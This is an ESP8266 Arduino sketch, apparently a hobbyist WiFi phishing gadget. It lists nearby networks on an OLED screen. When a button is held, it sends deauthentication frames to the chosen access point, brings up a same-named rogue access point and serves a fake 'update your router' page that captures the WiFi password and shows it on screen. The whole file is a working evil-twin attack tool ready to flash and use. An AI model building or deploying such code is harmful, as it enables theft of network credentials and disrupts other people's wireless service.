#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include "SSD1306.h"
#include <ezButton.h>
#ifdef ESP8266
extern "C" {
#include "user_interface.h"
}
#endif
//_________________________________________________________________
SSD1306 display(0x3c, 4, 5); 
bool deAuth = false;
const int SHORT_PRESS_TIME = 500; 
const int LONG_PRESS_TIME  = 2000;
char ssid[20];
//----------------------------------------------------------------
// Captive Portal Prerequisites : -
//----------------------------------------------------------------
const char MAIN_page[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body>
<h3> UPDATE YOUR WIFI ROUTER</h3>
<form action="/update">
  Please Authorize to continue:<br>
  <input type="password" name="passwd" placeholder="PASSWORD">
  <br>
  <input type="submit" value="Submit">
</form> 
</body>
</html>
)=====";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer server(80); 

//ip on browser routine
void handleRoot() {
 String s = MAIN_page; //Read HTML contents
 server.send(200, "text/html", s); //Send web page
}
//submit button routine 
void handleForm() {
 String passwd = server.arg("passwd"); 
 Serial.print("Password:");
 Serial.println(passwd); 
 display.clear();
 display.setFont(ArialMT_Plain_10);
 display.drawString(0, 0, "Password Captured:");
 display.drawString(0, 20, passwd);
 display.display();
 WiFi.mode(WIFI_OFF);
 delay(15000);
 ESP.restart();
 //String s = "<a href='/'> Go Back </a>";
 //server.send(200, "text/html", s); //Send web page
}

//----------------------------------------------------------------
uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};

uint8_t packet2[26] = {
    /*  0 - 1  */ 0xC0,
    0x00, // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00,
    0x00, // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC, // source (ap)
    /* 16 - 21 */ 0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00,
    0x00, // fragment & squence number
    /* 24 - 25 */ 0x01,
    0x00 // reason code (1 = unspecified reason)
};
enum SendPacketStatus {
    SEND_PACKET_SUCCESS,
    SEND_PACKET_WIFI_ERROR,
    SEND_PACKET_SEND_ERROR,
    SEND_PACKET_TIMEOUT_ERROR,
};

SendPacketStatus sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {
    wifi_set_channel(wifi_channel);
    for (int i = 0; i < tries; i++) {
        int ret = wifi_send_pkt_freedom(packet, packetSize, 0);
        if (ret == 0) {
            return SEND_PACKET_SUCCESS;
        } else if (ret == -1) {
            // WiFi error occurred
            return SEND_PACKET_WIFI_ERROR;
        } else if (ret == -2) {
            // Failed to send packet
            continue;
        } else if (ret == -3) {
            // Packet transmission timed out
            return SEND_PACKET_TIMEOUT_ERROR;
        }
    }
    // All tries failed
    return SEND_PACKET_SEND_ERROR;
}

bool deauthDevice(uint8_t* mac, uint8_t wifi_channel, uint8_t packet_type = 0xc0) {
    const uint8_t packet_size = sizeof(packet2);
    bool success = false;
    uint8_t* packet = new uint8_t[packet_size];

    // copy the template packet to a new buffer
    memcpy(packet, packet2, packet_size);

    // update the packet type
    packet[0] = packet_type;

    // update the MAC addresses
    memcpy(&packet[10], mac, 6);
    memcpy(&packet[16], mac, 6);

    // send the packet
    if (sendPacket(packet, packet_size, wifi_channel, 2)) {
        success = true;
    }

    // cleanup
    delete[] packet;

    return success;
}
//_____________________________________________________________________

ezButton button(2);  

unsigned long pressedTime  = 0;
unsigned long releasedTime = 0;
boolean bt = false;
boolean caPtl = true;
#define flipDisplay true

int n,i=0;
void setup() {
  display.init();
  if(flipDisplay) display.flipScreenVertically();
  //_____________________________________________
  display.clear();
  display.setFont(ArialMT_Plain_16);
  display.drawString(0, 0, "WiFi");
  display.drawString(0, 16, "Pishing");
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 50, "AshfaqueKhan");
  display.display();
  //_____________________________________________
  Serial.begin(115200);
  Serial.println("");
  //_____________________________________________
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(); 
  delay(100);
  n = WiFi.scanNetworks();
  //_____________________________________________
  button.setDebounceTime(50);
  //_____________________________________________
  delay(2500);
}

void disp()
{
  button.loop(); 
  if(button.isPressed())
  { 
    bt=true;
    pressedTime = millis();
  }
  if(button.isReleased()) {
    releasedTime = millis();
    bt=false;
    long pressDuration = releasedTime - pressedTime;

    if( pressDuration < SHORT_PRESS_TIME )
      Serial.println("A short press is detected");
      i++;
  }
  long pressDuration2 = millis() - pressedTime;
  if( pressDuration2 > LONG_PRESS_TIME && bt==true )
  {
    deAuth=true;
    bt=false;
  }
    i=i%n;
    display.clear();
    display.setFont(ArialMT_Plain_16);
    display.drawString(0, 0, WiFi.SSID(i));
    display.drawString(0, 16, "SignaL |");
    display.drawString(64, 16, String(WiFi.RSSI(i)));
    display.drawString(0, 32, "Channel|");
    display.drawString(64, 32, String(WiFi.channel(i)));
    display.setFont(ArialMT_Plain_10);
    display.drawString(0, 50, String(i+1));
    display.drawString(6, 50,"  /  ");
    display.drawString(10, 50, String(n));
    display.display();
}

void deauthLoop()
{
    WiFi.SSID(i).toCharArray(ssid,20);
    deauthDevice(WiFi.BSSID(i), WiFi.channel(i));
    display.clear();
    display.setFont(ArialMT_Plain_16);
    display.drawString(0, 0, WiFi.SSID(i));
    display.drawString(0, 16, "SignaL |");
    display.drawString(64, 16, String(WiFi.RSSI(i)));
    display.drawString(0, 32, "Channel|");
    display.drawString(64, 32, String(WiFi.channel(i)));
    display.setFont(ArialMT_Plain_10);
    display.drawString(0, 50, "Deauthenticating");
    display.drawString(100, 50,String(deauthDevice(WiFi.BSSID(i), WiFi.channel(i))));
    display.display();
    if(caPtl)
    {
        WiFi.mode(WIFI_AP_STA);// dual mode
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(ssid);  
        Serial.println("");
        dnsServer.start(DNS_PORT, "*", apIP);
        server.on("/", handleRoot);
        server.on("/update", handleForm);
        server.onNotFound(handleRoot);
        server.begin(); 
        caPtl=false;
    }
    delay(1000);
}
void loop()
{
  if(deAuth)
  {
    deauthLoop();
    dnsServer.processNextRequest();
    server.handleClient();  
  }
  else
  {
    disp();
  }
}
